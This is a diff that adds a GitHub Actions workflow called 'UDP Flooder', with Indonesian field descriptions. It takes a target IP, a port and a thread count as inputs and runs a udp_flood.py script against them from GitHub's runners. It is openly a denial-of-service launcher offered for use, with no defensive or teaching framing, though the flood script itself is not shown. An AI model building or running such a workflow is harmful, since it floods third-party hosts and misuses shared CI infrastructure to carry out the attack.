@@ -1,0 +1,40 @@
+name: UDP Flooder
+
+on:
+  workflow_dispatch:
+    inputs:
+      target_ip:
+        description: "Target IP (contoh: 192.168.1.1)"
+        required: true
+        default: "192.168.1.1"
+      target_port:
+        description: "Target Port (contoh: 9999)"
+        required: true
+        default: "9999"
+      threads:
+        description: "Jumlah threads (contoh: 50)"
+        required: true
+        default: "50"
+
+jobs:
+  udp_flood:
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Checkout Repository
+        uses: actions/checkout@v3
+
+      - name: Setup Python
+        uses: actions/setup-python@v4
+        with:
+          python-version: '3.x'
+
+      - name: Install Dependencies
+        run: |
+          python -m pip install --upgrade pip
+
+      - name: Run UDP Flooder
+        run: |
+          python udp_flood.py ${{ github.event.inputs.target_ip }} \
+                               ${{ github.event.inputs.target_port }} \
+                               ${{ github.event.inputs.threads }}
